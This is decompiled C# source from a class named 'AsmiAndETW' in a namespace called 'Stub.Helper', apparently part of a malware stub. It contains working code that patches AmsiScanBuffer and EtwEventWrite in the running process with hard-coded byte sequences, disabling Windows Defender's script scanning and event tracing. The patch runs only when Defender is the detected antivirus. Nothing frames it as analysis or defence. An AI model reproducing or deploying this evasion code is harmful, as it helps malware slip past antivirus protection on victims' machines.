using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using Stub.Helper.CryptString;

namespace Stub.Helper
{
	// Token: 0x02000008 RID: 8
	internal class AsmiAndETW
	{
		// Token: 0x06000010 RID: 16 RVA: 0x00002898 File Offset: 0x00000A98
		private static void Patcham_si(byte[] patch)
		{
			string text = "amsi.dll";
			using (IEnumerator enumerator = Process.GetCurrentProcess().Modules.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					if (((ProcessModule)enumerator.Current).ModuleName == text)
					{
						AsmiAndETW.PatchMem(patch, text, "AmsiScanBuffer");
					}
				}
			}
		}

		// Token: 0x06000011 RID: 17 RVA: 0x000020EA File Offset: 0x000002EA
		private static void PatchETW(byte[] Patch)
		{
			AsmiAndETW.PatchMem(Patch, "ntdll.dll", "EtwEventWrite");
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00002918 File Offset: 0x00000B18
		private static void PatchMem(byte[] patch, string library, string function)
		{
			try
			{
				IntPtr processHandle = new IntPtr(-1);
				IntPtr exportAddress = DInvokeCore.GetExportAddress(Enumerable.FirstOrDefault<ProcessModule>(Enumerable.Where<ProcessModule>(Enumerable.Cast<ProcessModule>(Process.GetCurrentProcess().Modules), (ProcessModule x) => library.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase))).BaseAddress, function);
				IntPtr intPtr = new IntPtr(patch.Length);
				uint num = 0U;
				DllImport.NtProtectVirtualMemory(processHandle, ref exportAddress, ref intPtr, 64U, ref num);
				Marshal.Copy(patch, 0, exportAddress, patch.Length);
			}
			catch
			{
			}
		}

		// Token: 0x06000013 RID: 19 RVA: 0x000029A4 File Offset: 0x00000BA4
		public static void Bypass()
		{
			if (!Settings.AntiVirus.ToLower().Contains("defender") || Settings.AntiVirus.ToLower().Contains("avast"))
			{
				return;
			}
			try
			{
				if (IntPtr.Size != 4)
				{
					AsmiAndETW.Patcham_si(AsmiAndETW.x64_am_si_patch);
					AsmiAndETW.PatchETW(AsmiAndETW.x64_etw_patch);
				}
				else
				{
					AsmiAndETW.Patcham_si(AsmiAndETW.x86_am_si_patch);
					AsmiAndETW.PatchETW(AsmiAndETW.x86_etw_patch);
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400000B RID: 11
		private static byte[] x64_etw_patch = new byte[]
		{
			72,
			51,
			192,
			195
		};

		// Token: 0x0400000C RID: 12
		private static byte[] x86_etw_patch = new byte[]
		{
			51,
			192,
			194,
			20,
			0
		};

		// Token: 0x0400000D RID: 13
		private static byte[] x64_am_si_patch = new byte[]
		{
			184,
			87,
			0,
			7,
			128,
			195
		};

		// Token: 0x0400000E RID: 14
		private static byte[] x86_am_si_patch = new byte[]
		{
			184,
			87,
			0,
			7,
			128,
			194,
			24,
			0
		};
	}
}
